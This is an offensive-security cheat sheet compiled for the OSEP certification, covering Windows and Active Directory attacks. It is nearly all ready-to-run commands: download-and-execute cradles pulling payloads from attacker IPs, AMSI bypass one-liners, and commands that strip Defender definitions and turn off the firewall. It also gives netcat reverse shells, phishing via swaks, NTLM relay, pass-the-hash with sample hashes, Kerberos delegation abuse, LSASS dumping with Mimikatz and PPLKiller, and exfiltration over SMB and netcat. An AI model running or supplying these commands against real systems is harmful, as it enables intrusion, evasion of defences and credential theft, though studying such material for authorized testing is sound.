# **OSEP Reference**

<br>

#### Compiled by: **purg3**
*Under Construction**
***

I hope this helps you on your journey to passing the OSEP. I have pulled together many repo's related to this course. When you do eventually reach the tools list please show some love to the authors.

**PLEASE DONT UPLOAD TO VIRUSTOTAL AND WHEN TESTING ON WINDOWS ISOLATE IT FROM THE NET, PERFORM AV TESTING, WIPE, FRESH INSTALL, REPEAT**. If you want to update your AV do so manually.

Enjoy.

<br>


# Table of Contents

- [MSSQL](#mssql)
- [TTY](#tty)
- [Powershell](#powershell)
    - [Check 64bit Shell](#check-64bit-shell)
        - [Change Passwd](#change-passwd)
        - [Run DLL](#run-dll)
        - [Add User](#add-user)
        - [Execute Cradle](#execute-cradle)
        - [Download Cradle](#download-cradle)
        - [Download Files](#download-files)
        - [Create Session](#create-session)
        - [Enter Session](#enter-session)
        - [Remote Copy](#remote-copy)
        - [Remote exec](#remote-exec)
        - [Sharploader](#sharploader)
        - [Load Assembly](#load-assembly)
        - [Covert & Change passwd](#covert--change-passwd)
- [Antivirus](#antivirus)
    - [AMSI](#amsi)
        - [CLM](#clm)
        - [Kill Defender](#Kill-Defender-via-TrustedInstaller)
        - [Java](#java)
        - [App Locker](#app-locker)
        - [Check PPL](#check-ppl)
        - [Roll-Back Defender Definitions](#roll-back-defender-definitions)
        - [Restricted Admin RDP](#restricted-admin-rdp)
- [Phishing](#phishing)
- [Network Forwarding](#network-forwarding)
     - [SSH](#ssh)
        - [Metasploit](#metasploit)
        - [Chisel](#chisel)
- [Metasploit](#metasploit-1)
     - [Payload Configs](#payload-configs)
        - [Metasploit Modules](#metasploit-modules)
- [Lateral Movement](#lateral-movement)
     - [BloodHound](#bloodhound)
        - [Relay](#relay)
        - [Fileless Movemen](#fileless-movemen)
        - [RDP](#rdp)
        - [NC](#nc)
        - [Pass The Hash // CME // Impacket // NC](#pass-the-hash--cme--impacket--nc)
        - [LAPS](#laps)
        - [Unconstrained Delegation](#unconstrained-delegation)
        - [Constrained Delegation](#constrained-delegation)
        - [Resource Based Constrained Delegation](#resource-based-constrained-delegation)
- [Exfiltrate Data](#exfiltrate-data)
- [Privilege Escalation](#privilege-escalation)
     - [CMD](#cmd)
        - [UAC](#uac)
        - [SeatBelt](#seatbelt)
        - [AccessChk](#accesschk)
        - [Minidump](#minidump)
        - [Bypass PPL / Mimikatz / PPLKiller](#bypass-ppl--mimikatz--pplkiller)
        - [PowerUp](#powerup)



# MSSQL

```bash
mssqlclient.py will:fdsfssdfDFG4@172.16.X.151 -port 1433 -windows-auth
```

```powershell
Get-SQLServerLinkCrawl
```

```powershell
Invoke-OSCmd -Instance MA02 -Command ""
sharpsql.exe invoke-oscmd -Instance MA00 -Command 'powershell.exe /c c:\users\public\payload.ps1'
sharpsql.exe invoke-oscmd -Instance MA00 -Command 'powershell.exe /c iex(new-object net.webclient).downloadstring(''''http://172.21.23.27/payload.ps1'''')'
```

* * *

# TTY

```bash
ctrl + Z
stty raw -echo; fg
stty rows 200 stty cols 200
export TERM=xterm-256color

exec /bin/bash
or
python -c 'import pty;pty.spawn("/bin/bash")
```

* * *

# Powershell

##### Check 64bit Shell

```powershell
[Environment]::Is64BitOperatingSystem
```

##### Change Passwd

```powershell
$creds = New-Object System.Management.Automation.PSCredential ("final.com\adminWebSvc", (ConvertTo-SecureString "FGjksdff89sdfj" -AsPlainText -Force)) 
$UserPassword = ConvertTo-SecureString 'PasswordRulon123!' -AsPlainText -Force 
Set-DomainUserPassword -Identity nina -AccountPassword $UserPassword -Credential $creds -Verbose 
```

##### Run DLL

```powershell
Rundll32 c:\users\public\payload.dll,run
```
##### Add User

```powershell
net user John Password123! /add /domain 
net localgroup "Remote Desktop Users" John  /add /domain 
net group "domain admins" John  /add /domain 

runas /user:john "Powershell.exe /c whoami"
```

##### Execute Cradle

```powershell
iex(new-object net.webclient).downloadstring('http://ip:port/')
```

##### Download Cradle

```powershell
(new-object System.Net.Webclient).DownloadFile("http://ip:port/","C:\Windows\Temp\temp.ps1")
```

##### Download Files

```powershell
certutil -urlcache -split -f "http://ip-addr:port/file" [output-file]
```

```powershell
Powershell.exe iwr -uri http://ip:port -o C:\Windows\Tasks\
```

```powershell
Powershell.exe wget http://ip:port/ -o C:\Windows\Temp\
```

```powershell
cmd.exe /c curl http://ip:port/ -o C:\Windows\Temp\
```

##### Create Session

```powershell
$sess = New-PSSession -ComputerName <name>
```

##### Enter Session

```powershell
Enter-PSSession $sess
```

##### Remote Copy

```powershell
Copy-Item -Path C:\Users\pubilc\tmp.ps1 -Destination 'C:\Users\public\tmp.ps1 -ToSession $sess
```

##### Remote exec

```powershell
invoke-Command -ScriptBlock {whoami} -Session $sess
```

##### Sharploader

```powershell
Invoke-SharpEncrypt -file C:\Path\to\file.exe -password SuperDumperStrongPassword -outfile C:\Path\to\file.enc

iex(new-object net.webclient).downloadstring('http://ip:port/invoke-sharploader.ps1');invoke-sharploader -location http://ip:port/program.enc -password SuperDumperStrongPassword -noArgs`
```

##### Load Assembly

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
```

##### Covert & Change passwd

```powershell
$remote = New-Object System.Management.Automation.PSCredential (“DOMAIN\USER”, (ConvertTo-SecureString “PASSWORD” -AsPlainText -Force)) 
$creds = ConvertTo-SecureString 'PasswordRulon123!' -AsPlainText -Force 
Set-DomainUserPassword -Identity USER -AccountPassword $creds -Credential $remote -Verbose 
```

* * *

# Antivirus

##### AMSI

```powershell
(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
```

```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
```

##### CLM

```powershell
certutil -encode clm.exe enc5.txt 
```

```powershell
$ExecutionContext.SessionState.LanguageMode
```

```powershell
powershell -windowstyle hidden bitsadmin /Transfer newjob3 http://192.168.49.173/enc3.txt c:\\windows\\temp\\enc3.txt;certutil -decode c:\\windows\\temp\\enc3.txt c:\\windows\\temp\\bypass.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\temp\\bypass.exe
```

##### Kill Defender via TrustedInstaller

```powershell
iex(new-object net.webclient).downloadstring('http://172.21.23.10/uacbypass.ps1');alt
.\wsudo -T powershell
.\fuckdefender.ps1
reboot
```

##### Java

```powershell
mshta file.hta
```

##### App Locker

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 
```

##### Check PPL

```powershell
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

##### Roll-Back Defender Definitions

```powershell
cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all
 
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring " /t REG_DWORD /d 1 /f

REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableBehaviorMonitoring " /t REG_DWORD /d 1 /f

Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true 

NetSh Advfirewall set allprofiles state off 

iex(new-object net.webclient).downloadstring('http://172.21.23.10/defendersdeath.ps1')
iex(new-object net.webclient).downloadstring('http://172.21.23.10/fuckdefender.ps1')

```

##### Restricted Admin RDP

```powershell
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin  -Value 0
```

* * *

# Phishing

```powershell
swaks --body 'click me http://192.168.X.X/file.hta' --add-header "Really: 1.0" --add-header "Content-Type: text/html" --header "Subject: Important" -t victim@corp.com -f attacker@corp.com --server 192.168.X.X
```

```powershell
sendmail -f attacker@email.com -t victim@email.com -s 192.168.x.x -u "Subject" -m "body"
```

* * *

# Network Forwarding

##### SSH

```powershell
Local
ssh user@KillaOcean -L 127.0.0.1:5577:127.0.0.1:5577

Remote
ssh user@KillaOcean -R 127.0.0.1:5577:127.0.0.1:22

Dynamic
ssh -NfD 1080 user@KillaOcean

Sock Proxy
proxychains4 nmap 192.168.1.0/24

Login Domain via ssh
proxychains ssh -i tommypriv final\\tommy@172.16.222.184


```

##### Metasploit

```powershell
portfwd add -l 7777 -r 172.17.0.2 -p 3006

use post/multi/manage/autoroute
set session x
run
+
use auxiliary/server/socks_proxy
run
```

##### Chisel

```powershell
- Attacker
chisel server -p 6666 --reverse
- Victim
chisel client attackerip:6666 R:2222:127.0.0.1:3306/tcp

Socks_Proxy
- Attacker
chisel server -p 6666 --socks5 --reverse
- Victim
chisel client attackerip:6666 R:5000:socks
```

* * *

# Metasploit

##### Payload Configs

```bash
set enablestageencoding true
set stageencoder x64/zutto_dekiru
```

##### Metasploit Modules

```bash
load incognito
load kiwi
getsystem
upload /path/in/hdd/payload.exe exploit.exe
download /path/in/victim
execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
execute -i H -f powershell < spawn x64 process
pgrep spool
exploit -j < run in background
sudo msfconsole -qx "use exploit/multi/handler ;set payload windows/meterpreter/reverse_tcp; set lhost tun0; set lport 4444;exploit;"
sudo msfconsole -qx "use exploit/multi/handler ;set payload windows/meterpreter/reverse_https; set lhost tun0; set lport 4444;exploit;"

```

* * *

# Lateral Movement

##### BloodHound

```powershell
.\SharpHound.exe -c all -d active.htb -SearchForest
.\SharpHound.exe --EncryptZip --ZipFilename export.zip
.\SharpHound.exe -c all,GPOLocalGroup
.\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
.\SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
.\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23
.\SharpHound.exe -c all,GPOLocalGroup --searchforest

Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>

pip install bloodhound
bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
```

##### Relay

```bash
cme smb --gen-relay-list smb_targets.txt 172.21.23.0/24
Responder -I tun0 -dw
ntlmrelayx.py -no-http-server -smb2support -t $IP 
-c 'cmd /c whoami'
or
-c "cmd /c powershell.exe iex(new-object net.webclient).downloadstring('http://172.21.23.27/rev.ps1')"
or
-e payload.exe
```

##### Fileless Movemen

```powershell
$sess = New-PSSession -ComputerName <Name>
Copy-item -path C:\users\public\payload.ps1 -destination 'C:\users\public\payload.ps1' -tosession $sess

latmov.exe <server> SensorService "cmd.exe /c nc.exe 
latmov.exe <server> SenorService "cmd.exe /c powershell.exe iex(new-object net.webclient).downloadstring('http://172.21.23.27/payload.ps1')"
or
proxychains python scshell.py -service-name Sensorservice DOMAIN/USERNAME:PASSWORD@ComputerIP
proxychains python scshell.py -service-name Sensorservice DOMAIN/USERNAME@ComputerIP -hashes 00000000000000000000000000000000:aec2214937bedcfa722c4123ca859423
```

##### RDP

```bash
xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /drive:/tmp /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
```

##### NC

```powershell
nc.exe ip port -e cmd.exe
nc -lnvp 4444
```

##### Pass The Hash // CME // Impacket // NC

```powershell
nc.exe 172.21.24.11 443 -e cmd.exe
nc 172.21.23.100 443 -e /bin/bash

##CRACKMAPEXEC

crackmapexec smb 192.168.1.101 -u user1 user2 user3 -p Summer18
crackmapexec smb 192.168.1.101 -u user1 -p password1 password2 password3
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -x 'whoami'
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -x 'net user Administrator /domain' --exec-method atexec
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -x 'net user Administrator /domain' --exec-method wmiexec
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -X '$PSVersionTable' --exec-method wmiexec
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --sam
crackmapexec smb -L
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz
crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' -M mimikatz -o COMMAND='privilege::debug'
crackmapexec smb 192.168.1.1 -d zoro.gold.local -k -u bonclay -p Ocotober2022
export KRB5CCNAME=/home/bonclay/impacket/administrator.ccache / smb zoro.gold.local --use-kcache
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares
crackmapexec smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
crackmapexec smb 192.168.1.0/24 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
crackmapexec smb <ip> -u user-can-read-laps -p pass --laps
crackmapexec smb <ip> -u 'user' -p 'pass' -M spooler
crackmapexec ldap 192.168.0.104 -u harry -p pass --kerberoasting / hashcat -m13100 output.txt wordlist.txt

##IMPACKET

python smbclient.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
pth-smbclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105/c$
python psexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
python wmiexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105
pth-wmic -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105 "select Name from Win32_UserAccount"
python rpcdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
pth-rpcclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105
pth-net rpc share list -U 'ignite\Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38' -S 192.168.1.105
pth-winexe -U Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105 cmd.exe
python atexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105 whoami
python lookupsid.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
python samrdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
```

##### LAPS

```powershell
iex(new-object net.webclient).downloadstring(http://ip:port/LAPSToolkit.ps1);Get-LAPSComputers
```

```powershell
iex(New-Object Net.WebClient).DownloadString('http://IP/PowerView.ps1');Get-ADObject -Name MachineName -DomainController IP -Properties ms-mcs-admpwd 
```

##### Unconstrained Delegation

```powershell
Rubeus:

Get-NetComputer -UnConstrained
Rubeus triage
Rubeus monitor /monitorinterval:1 /nowrap
SpoolSample DC01 helpdesk.lab
Rubeus ptt /ticket:
klist


Mimikatz:

iex(new-object net.webclient).downloadstring('http://ip:port/mimikatz.txt');invoke-mimikatz -Command privilege::debug;invoke-mimikatz -Command sekurlsa::tickets;invoke-mimikatz -Command '"sekurlsa::tickets /export"';invoke-mimikatz -command '"kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi"'
```

##### Constrained Delegation

```powershell
User Constrained Delegation

Get-NetUser -TrustedToAuth
Rubeus.exe tgtdeleg
Rubeus.exe s4u /ticket: /impersonateuser:administrator /domain:offense.local /msdsspn:cifs/dc01.offense.local /dc:dc01.offense.local /ptt
klist


Machine Constrained Delegation

NT AUTHORITY REQUIRED

Get-NetComputer -TrustedToAuth
[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')
$idToImpersonate.Impersonate()
[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
```

##### Resource Based Constrained Delegation

```powershell
New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
Rubeus.exe hash /password:'p@ssword!'
Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt

#In Constrain and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.
```

* * *

# Exfiltrate Data

```powershell
Sending File
nc -vn 172.21.23.10 4444 < file.txt
Getting File
nc -lnvp 4444 > file.txt
```

```powershell
sudo impacket-smbserver -comment "SHARE" TMP /tmp -smb2support
copy-item -path c:\users\public\lsass.dmp \\172.21.23.27\tmp\lsass.dmp
```

```powershell
scp file.txt remote_username@10.10.0.2:/remote/directory
```

```powershell
python -m pyftpdlib -p 21
tftp -i ip-addr {GET | PUT} file
```

* * *

# Privilege Escalation

##### CMD

```powershell
net localgroup 'administrators'
net user /domain

```

##### UAC

```powershell
iex(new-object net.webclient).downloadstring('http://172.21.23.10/uacbypass.ps1');alt
```

##### SeatBelt

```powershell
Seatbelt.exe -group=user
```

##### AccessChk

```powershell
accesschk.exe "currentuser" C:\Windows -wus
accesschk.exe -ucqv servicename
```

##### Minidump

```powershell
.\mini.exe
sudo impacket-smbserver -comment "SHARE" TMP /tmp -smb2support
copy-item -path c:\users\public\lsass.dmp \\172.21.23.27\tmp\lsass.dmp
pypykatz lsa minidump /tmp/lsass.dmp
```

##### Bypass PPL / Mimikatz / PPLKiller

```powershell
Mimikatz PPL

Req: High Mandatory Shell
Transfer mimidrv.sys to machine

sc create mimidrv binPath= C:\Path\to\mimidrv.sys type= kernel start= demand

sc start mimidrv

iex(new-object net.webclient).downloadstring('http://172.21.23.10/mimikatz.txt');invoke-mimikatz -Command !+ ;invoke-mimikatz -Command '"!processprotect /process:lsass.exe /remove; invoke-mimikatz -Command sekurlsa::logonpasswords"

PPLKiller

Req: High Mandatory Shell
upload RTCore64.sys
upload PPLKiller.exe
PPLKiller.exe /installDriver
PPLKiller.exe /disableLSAProtection
```

##### PowerUp

```powershell
iex(new-object net.webclient).downloadstring('http://ip:port/powerup.ps1');invoke-allchecks >$null
```
